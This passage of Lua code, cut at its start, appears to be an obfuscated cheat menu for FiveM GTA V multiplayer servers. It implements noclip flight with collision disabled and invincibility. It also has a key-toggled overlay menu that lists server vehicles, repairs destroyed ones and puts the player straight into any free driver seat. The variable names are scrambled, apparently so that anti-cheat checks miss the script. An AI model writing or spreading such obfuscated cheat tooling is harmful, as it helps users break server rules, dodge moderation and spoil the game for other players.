    vitolasRPMQCUeMEUCUgg(0, 34, vitolasRPMQCUeMEUCUzz) --MoveLeftOnly

    vitolasRPMQCUeMEUCUgg(0, 30, vitolasRPMQCUeMEUCUzz) --MoveLeftRight

    vitolasRPMQCUeMEUCUgg(0, 267, vitolasRPMQCUeMEUCUzz) --MoveRight
    vitolasRPMQCUeMEUCUgg(0, 35, vitolasRPMQCUeMEUCUzz) --MoveRightOnly

    vitolasRPMQCUeMEUCUgg(0, 44, vitolasRPMQCUeMEUCUzz) --Cover
    vitolasRPMQCUeMEUCUgg(0, 20, vitolasRPMQCUeMEUCUzz) --MultiplayerInfo

    local yoff = 0.0
    local zoff = 0.0

    if IsDisabledControlPressed(0, 32) then
        yoff = 0.5
    end
    if IsDisabledControlPressed(0, 33) then
        yoff = -0.5
    end
    if IsDisabledControlPressed(0, 34) then
        SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) + 3.0)
    end
    if IsDisabledControlPressed(0, 35) then
        SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) - 3.0)
    end
    if IsDisabledControlPressed(0, 44) then
        zoff = 0.21
    end
    if IsDisabledControlPressed(0, 20) then
        zoff = -0.21
    end

    newPos =
        GetOffsetFromEntityInWorldCoords(noclipEntity, 0.0, yoff * (currentSpeed + 0.3), zoff * (currentSpeed + 0.3))

    local heading = GetEntityHeading(noclipEntity)
    SetEntityVelocity(noclipEntity, 0.0, 0.0, 0.0)
    SetEntityRotation(noclipEntity, 0.0, 0.0, 0.0, 0, admgordolas)
    SetEntityHeading(noclipEntity, heading)

    SetEntityCollision(noclipEntity, admgordolas, admgordolas)
    SetEntityCoordsNoOffset(noclipEntity, newPos.x, newPos.y, newPos.z, vitolasRPMQCUeMEUCUzz, vitolasRPMQCUeMEUCUzz, vitolasRPMQCUeMEUCUzz)

    FreezeEntityPosition(noclipEntity, admgordolas)
    SetEntityInvincible(noclipEntity, admgordolas)
    SetEntityCollision(noclipEntity, vitolasRPMQCUeMEUCUzz, vitolasRPMQCUeMEUCUzz)
end





local platano = 
{
    closed = vitolasRPMQCUeMEUCUzz,
    key = 166,
    entityEnumerator = 
    {
        __gc = function(enum)
            if enum.destructor and enum.handle then
                enum.destructor(enum.handle)
            end
            enum.destructor = vitolasRPMQCUeMEUCUss
            enum.handle = vitolasRPMQCUeMEUCUss
        end
    }
}

function platano:enumerate_vehicles()
    return coroutine.wrap(function()
        local iter, id =  FindFirstVehicle()
        if not id or id == 0 then
            EndFindVehicle(iter)
            return
        end
        
        local enum = {handle = iter, destructor = EndFindVehicle}
        setmetatable(enum, platano.entityEnumerator)
        
        local next = vitolasRPMQCUeMEUCUzz
        repeat
            coroutine.yield(id)
            next, id = FindNextVehicle(iter)
        until not next
        
        enum.destructor, enum.handle = vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss
        EndFindVehicle(iter)
    end)
end

function platano:rectangle(x, y, w, h, r, g, b, a)
    local resx, resy = GetActiveScreenResolution()
    local rectw, recth = w / resx, h / resy
    local rectx, recty = x / resx + rectw / 2, y / resy + recth / 2
    DrawRect(rectx, recty, rectw, recth, r, g, b, a)
end

function platano:text (text, font, centered, x, y, scale, r, g, b, a)
    local resx, resy = GetActiveScreenResolution()
    SetTextFont(font)
    SetTextScale(scale, scale)  
    SetTextCentre(centered)  
    SetTextColour(r, g, b, a) 
    BeginTextCommandDisplayText("STRING")  
    AddTextComponentSubstringPlayerName(text)  
    EndTextCommandDisplayText(x / resx, y / resy)
end

function platano:hovered (x, y, w, h)
    local mousex, mousey = GetNuiCursorPosition() 
    if mousex >= x and mousex <= x + w and mousey >= y and mousey <= y + h then 
        return vitolasRPMQCUeMEUCUzz 
    else 
        return admgordolas 
    end 
end

function platano:button(name,xx,yy,r,g,b)
    local x,y = GetNuiCursorPosition()
    platano:text(name,4,0,xx,yy + 8, 0.3,255, 255,255,255)
    
    if platano:hovered(xx,yy + 8,100,18) then 
        
        if IsDisabledControlPressed(0, 92) then
            platano:text(name,4,0,xx,yy + 8, 0.3,r, g,b,255)
        end
        
        if IsDisabledControlJustPressed(0, 92) then
            return vitolasRPMQCUeMEUCUzz
        end
        
    else
        return admgordolas
    end
end

function platano:rainbow(speed)
    local return_values = {}
    
    local game_timer = GetGameTimer() / 200
    
    return_values.r = admmeupau.floor(admmeupau.sin(game_timer * speed + 0) * 127 + 128)
    return_values.g = admmeupau.floor(admmeupau.sin(game_timer * speed + 2) * 127 + 128)
    return_values.b = admmeupau.floor(admmeupau.sin(game_timer * speed + 4) * 127 + 128)
    
    return return_values
end

Citizen.CreateThread(function()
    while vitolasRPMQCUeMEUCUzz do
        if IsDisabledControlJustPressed(1, platano.key) then
            platano.closed = not platano.closed
        end
        
        if platano.closed == admgordolas then
            
            
            local rainbow = platano:rainbow(1.0)
            
            platano:rectangle(19,19,152,502, 0, 0, 255, 255)
            platano:rectangle(20,20,150,500,0,0,0,255)
            
            local x,y = GetNuiCursorPosition()
            
            local i = 0
            
            for veh in platano:enumerate_vehicles() do              
                if IsEntityDead(veh) then
                    i = i + 1
                    if platano:button(GetDisplayNameFromVehicleModel(GetEntityModel(veh)) .. " [~r~ Destruído ~w~]",25,i * 16,255,255,255) then
                        SetVehicleFixed(veh)
                        SetPedIntoVehicle(GetPlayerPed(-1),veh,-1)
                    end
                else    
                    if GetPedInVehicleSeat(veh,-1) == 0 then
                        i = i + 1
                        if platano:button(GetDisplayNameFromVehicleModel(GetEntityModel(veh)) .. " [~g~ Livre ~w~]",25,i * 16,255,255,255) then
                            SetPedIntoVehicle(GetPlayerPed(-1),veh,-1)
                        end
                    end
                end
            end
            
            platano:rectangle(x, y, 5, 5, 0, 0, 255, 255)
            
        end
        vitolasRPMQCUeMEUCUtt(0)
    end
end)